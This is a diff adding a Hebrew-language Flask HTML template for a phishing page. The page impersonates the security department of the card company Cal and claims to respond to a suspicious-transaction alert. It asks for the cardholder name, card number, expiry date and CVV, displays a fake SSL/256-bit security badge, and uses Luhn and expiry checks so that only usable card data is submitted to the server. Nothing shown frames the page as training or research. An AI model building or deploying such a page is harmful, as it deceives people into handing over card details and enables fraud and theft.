@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>אתר מתחזה</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/main.css') }}">
+</head>
+<body class="phishing-page">
+    <div class="container">
+        <div class="header">
+            <img src="/logo.png" alt="Logo" class="logo">
+        </div>
+
+        <div class="notice">
+    שלום, הגעת לאתר מחלקת ביטחון של חברת כאל, אנו מבינים כי קבלת הודעה על עסקה חשודה. אין בעיה, אנחנו על זה, אבל קודם כל מספר פרטים מזהים
+    
+        </div>
+
+        <form id="paymentForm" method="POST" action="/submit">
+            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
+            <div class="form-group">
+                <label for="cardName">שם בעל הכרטיס</label>
+                <input type="text" id="cardName" name="cardName" placeholder="ישראל ישראלי" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cardNumber">מספר כרטיס</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+
+            <div class="card-row">
+                <div class="form-group">
+                    <label for="expiry">תוקף</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+
+            <button type="submit" class="submit-btn">המשך</button>
+
+            <div class="security-badge">
+                אבטחת SSL | הצפנה 256-ביט
+            </div>
+        </form>
+    </div>
+
+    <script>
+        // Luhn algorithm for credit card validation
+        function luhnCheck(cardNumber) {
+            cardNumber = cardNumber.replace(/\D/g, '');
+            if (cardNumber.length < 13 || cardNumber.length > 19) return false;
+
+            let sum = 0, isEven = false;
+            for (let i = cardNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cardNumber.charAt(i));
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) digit -= 9;
+                }
+                sum += digit;
+                isEven = !isEven;
+            }
+            return (sum % 10) === 0;
+        }
+
+        function validateExpiryDate(expiry) {
+            if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+            const [month, year] = expiry.split('/').map(num => parseInt(num));
+            if (month < 1 || month > 12) return false;
+
+            const now = new Date();
+            const currentMonth = now.getMonth() + 1;
+            const currentYear = now.getFullYear() % 100;
+
+            if (year < currentYear) return false;
+            if (year === currentYear && month < currentMonth) return false;
+            return true;
+        }
+
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formattedValue;
+        });
+
+        document.getElementById('expiry').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.slice(0, 2) + '/' + value.slice(2, 4);
+            }
+            e.target.value = value;
+        });
+
+        document.getElementById('cvv').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+            const cardName = document.getElementById('cardName').value.trim();
+
+            if (cardName.length < 3) {
+                e.preventDefault();
+                alert('נא להזין שם בעל כרטיס תקין');
+                return false;
+            }
+
+            if (!luhnCheck(cardNumber)) {
+                e.preventDefault();
+                alert('מספר כרטיס אינו תקין. נא לבדוק ולהזין שוב.');
+                return false;
+            }
+
+            if (!validateExpiryDate(expiry)) {
+                e.preventDefault();
+                alert('תאריך תוקף אינו תקין או שפג תוקפו. נא להזין תאריך MM/YY תקף.');
+                return false;
+            }
+
+            if (cvv.length < 3 || cvv.length > 4) {
+                e.preventDefault();
+                alert('CVV אינו תקין. נא להזין 3-4 ספרות.');
+                return false;
+            }
+
+            return true;
+        });
+    </script>
+</body>
+</html>
